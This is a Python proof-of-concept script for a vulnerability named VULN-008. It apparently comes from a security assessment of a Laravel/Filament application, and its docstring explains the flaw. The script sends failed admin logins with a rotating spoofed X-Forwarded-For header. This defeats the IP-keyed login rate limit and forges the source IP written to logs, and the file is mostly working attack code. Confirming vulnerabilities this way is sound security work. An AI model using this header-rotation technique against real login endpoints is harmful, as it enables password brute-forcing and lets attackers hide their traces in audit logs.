#!/usr/bin/env python3
"""
VULN-008 — trustProxies(at: '*') makes request()->ip() client-controlled:
           IP-keyed rate limiting is bypassable + audit-log IP is forgeable.

Vulnerable code : targets/academico/bootstrap/app.php:16  ->  $middleware->trustProxies(at: '*');
Consumers       : app/Filament/Auth/Login.php:20          ->  $this->rateLimit(5)   (key = class|method|request()->ip())
                  app/Livewire/RegistrationWizard.php:163  ->  $key = 'registration:'.request()->ip()
CWE             : CWE-348 (Use of Less Trusted Source) / CWE-290 (Auth bypass via spoofing)

The flaw
--------
FrankenPHP terminates client connections directly in this deployment — there is no
fronting reverse proxy whose forwarded headers should be believed. Yet the app trusts
ALL proxies (`trustProxies(at: '*')`), so Symfony/Laravel take the left-most
`X-Forwarded-For` entry — a value the client fully controls — as `request()->ip()`.
Every IP-keyed control and every logged source IP is therefore attacker-chosen.

Exploitation idea
-----------------
The Filament login throttle keys its 5-attempts bucket on `request()->ip()`. Send
failed logins:
  * Phase A — a FIXED spoofed X-Forwarded-For: the throttle trips after 5 attempts
    (the response stops saying "These credentials do not match" and instead only
    sends a throttle notification). This proves the limiter is real and IP-keyed.
  * Phase B — a ROTATING X-Forwarded-For (a fresh value per request): the throttle
    NEVER trips — every attempt gets a fresh bucket. This proves the control is
    bypassable because the key is client-controlled.
That the bucket key changes with the header also proves `request()->ip()` == the
attacker's header value, which is exactly the value written to logs/activitylog/Sentry
=> forged source-IP attribution.

What a successful run proves
---------------------------
Same failed-login volume, two outcomes decided solely by an attacker-supplied header:
throttled when the header is fixed, never throttled when it rotates. Non-destructive
(only failed logins against a nonexistent account; no state is created, no account is
locked — the throttle is per-IP, not per-account).
"""
import os
import random
import secrets
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import lwlib
from lwlib import log

VULN = "VULN-008"
HERE = os.path.dirname(os.path.abspath(__file__))

# A definitely-wrong credential against a nonexistent account: failed auth, no lockout.
BAD_EMAIL = f"nobody_{secrets.token_hex(4)}@example.invalid"
BAD_PASS = "definitely-wrong-" + secrets.token_hex(3)
ATTEMPTS = 8            # > the limit of 5, so a fixed IP is guaranteed to trip it


def one_login_attempt(xff: str) -> str:
    """Perform a single failed Filament login with the given X-Forwarded-For.
    Returns 'CREDS' if the response is a credential-failure, 'THROTTLED' if the
    rate-limit notification fired instead, or 'OTHER'."""
    s = lwlib.new_session()
    r = s.get(lwlib.BASE_URL + "/admin/login", timeout=30)
    csrf = lwlib.csrf_of(r.text)
    snap_raw, _ = lwlib.find_snapshot(r.text, "login")
    resp = lwlib.lw_update(
        s, snap_raw,
        updates={"data.email": BAD_EMAIL, "data.password": BAD_PASS, "data.remember": False},
        calls=[{"path": "", "method": "authenticate", "params": []}],
        csrf=csrf,
        extra_headers={"X-Forwarded-For": xff},
    )
    t = resp.text.lower()
    if "do not match" in t:
        return "CREDS"
    if "notifications" in t and "do not match" not in t:
        return "THROTTLED"
    return "OTHER"


def main():
    lwlib.banner(VULN, "trustProxies('*') -> client-controlled request()->ip()",
                 "Login::authenticate rateLimit(5) keyed on request()->ip() (== X-Forwarded-For)")

    # ---- Phase A: fixed spoofed IP -> throttle must engage ---------------------
    fixed_ip = f"203.0.113.{random.randint(2, 254)}"
    log("STEP", f"Phase A: {ATTEMPTS} failed logins, all with a FIXED X-Forwarded-For {fixed_ip}")
    a_results = []
    for i in range(1, ATTEMPTS + 1):
        res = one_login_attempt(fixed_ip)
        a_results.append(res)
        log("INFO", f"  attempt {i}: {res}")
    a_throttled = a_results.count("THROTTLED")
    log("INFO", f"Phase A: {a_throttled}/{ATTEMPTS} throttled "
                f"(throttle engaged after the 5-attempt limit)")

    # ---- Phase B: rotating spoofed IP -> throttle must NOT engage --------------
    log("STEP", f"Phase B: {ATTEMPTS} failed logins, each with a DIFFERENT X-Forwarded-For")
    b_results = []
    for i in range(1, ATTEMPTS + 1):
        # fresh, attacker-chosen source IP per request
        rot_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        res = one_login_attempt(rot_ip)
        b_results.append(res)
        log("INFO", f"  attempt {i} (XFF {rot_ip}): {res}")
    b_throttled = b_results.count("THROTTLED")
    log("INFO", f"Phase B: {b_throttled}/{ATTEMPTS} throttled")

    # ---- Corroboration: the app resolves request()->ip() from X-Forwarded-For --
    log("STEP", "corroborating that request()->ip() == the spoofed header under the app's trust config")
    php = (
        '$r = Illuminate\\Http\\Request::create("http://localhost:20000/admin/login","POST");'
        '$r->headers->set("X-Forwarded-For","203.0.113.77, 10.0.0.5");'
        '$r->setTrustedProxies(["0.0.0.0/0","::/0"], Illuminate\\Http\\Request::HEADER_X_FORWARDED_FOR);'
        'echo "resolved_ip=".$r->ip();'
    )
    ip_out = lwlib.tinker(php).strip()
    log("INFO", f"tinker (replicating trustProxies('*')): {ip_out}")
    ip_forged = "resolved_ip=203.0.113.77" in ip_out

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"POST /livewire-{lwlib.LW_HASH}/update\n")
        f.write("X-Forwarded-For: <attacker-chosen>\n")
        f.write("Content-Type: application/json\n\n")
        f.write('{"components":[{"snapshot":"<Login snapshot>",'
                f'"updates":{{"data.email":"{BAD_EMAIL}","data.password":"<wrong>"}},'
                '"calls":[{"path":"","method":"authenticate","params":[]}]}]}\n')
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"Phase A (fixed XFF {fixed_ip}):    {a_results}\n")
        f.write(f"Phase B (rotating XFF):            {b_results}\n")
        f.write(f"Phase A throttled: {a_throttled}/{ATTEMPTS}\n")
        f.write(f"Phase B throttled: {b_throttled}/{ATTEMPTS}\n")
        f.write(f"IP resolution corroboration: {ip_out}\n")

    # A real limiter (Phase A trips) that a rotating header defeats (Phase B never trips).
    if a_throttled >= 1 and b_throttled == 0 and ip_forged:
        log("PROOF", f"Fixed IP -> throttle engaged ({a_throttled} blocked). Rotating IP -> "
                     f"NEVER throttled ({b_throttled} blocked) despite identical failed-login "
                     f"volume. request()->ip() resolves to the spoofed header ({ip_out}).")
        log("OK", "exploit confirmed — IP-keyed rate limiting bypassed; source IP is attacker-forgeable")
        lwlib.verdict(VULN, "CONFIRMED",
                      "client-controlled X-Forwarded-For rotates the rate-limit bucket and forges the logged IP")
        sys.exit(0)

    log("FAIL", f"expected Phase A>=1 throttled and Phase B==0 throttled with forged ip; "
                f"got A={a_throttled}, B={b_throttled}, ip_forged={ip_forged}")
    lwlib.verdict(VULN, "FAILED", "rate-limit bypass not demonstrated")
    sys.exit(1)


if __name__ == "__main__":
    main()
